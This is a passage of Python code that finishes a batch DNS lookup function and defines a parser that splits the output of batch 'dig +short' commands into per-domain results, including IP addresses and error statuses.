                            'error_message': str(e),
                            'exception': True
                        }
        
        successful_queries = len([r for r in results.values() if r['status'] == 'success'])
        logger.info(f"\n📊 Batch dig summary:")
        logger.info(f"   Total domains: {len(domains)}")
        logger.info(f"   Successful queries: {successful_queries}")
        logger.info(f"   Failed queries: {len(domains) - successful_queries}")
        
        return results
        
    except Exception as e:
        logger.error(f"❌ Batch dig execution failed: {e}")
        return results


def parse_batch_dig_output(output: str, domains: List[str]) -> Dict[str, Dict]:
    """
    Parse the output from a batch dig command that queries multiple domains.
    
    Args:
        output (str): Raw output from the batch dig command
        domains (List[str]): List of domains that were queried
        
    Returns:
        Dict[str, Dict]: Results indexed by domain name
    """
    results = {}
    
    try:
        # Split output by domain separators
        sections = output.split('=== ')
        
        for section in sections[1:]:  # Skip first empty section
            lines = section.strip().split('\n')
            if not lines:
                continue
                
            # First line should contain the domain name and ===
            domain_line = lines[0].strip()
            domain = domain_line.replace(' ===', '').strip()
            
            # Rest are the dig results
            dig_output_lines = lines[1:]
            
            # Filter out empty lines and extract IP addresses
            ip_addresses = []
            for line in dig_output_lines:
                line = line.strip()
                if line and '.' in line and not line.startswith(';') and not line.startswith('==='):
                    ip_addresses.append(line)
            
            if domain:
                results[domain] = {
                    'status': 'success' if ip_addresses else 'no_response',
                    'dig_command': f"dig +short {domain}",
                    'raw_response': '\n'.join(dig_output_lines),
                    'ip_addresses': ip_addresses,
                    'response_count': len(ip_addresses),
                    'exit_code': 0
                }
                
                if ip_addresses:
                    logger.info(f"✅ {domain} resolved successfully - {len(ip_addresses)} IPs")
                else:
                    logger.info(f"⚠️ {domain} - no response")
        
        # Handle any domains that weren't found in the output
        for domain in domains:
            if domain not in results:
                results[domain] = {
                    'status': 'parse_error',
                    'dig_command': f"dig +short {domain}",
                    'raw_response': '',
                    'error_message': 'Domain not found in batch output',
                    'ip_addresses': [],
                    'response_count': 0,
                    'exit_code': 1
                }
        
        return results
        
    except Exception as e:
        logger.error(f"❌ Error parsing batch dig output: {e}")
        # Return error results for all domains
        return {
            domain: {
                'status': 'exception',
                'dig_command': f"dig +short {domain}",
                'raw_response': '',
                'error_message': f"Error parsing batch output: {str(e)}",
                'exception': True
            } for domain in domains
        }
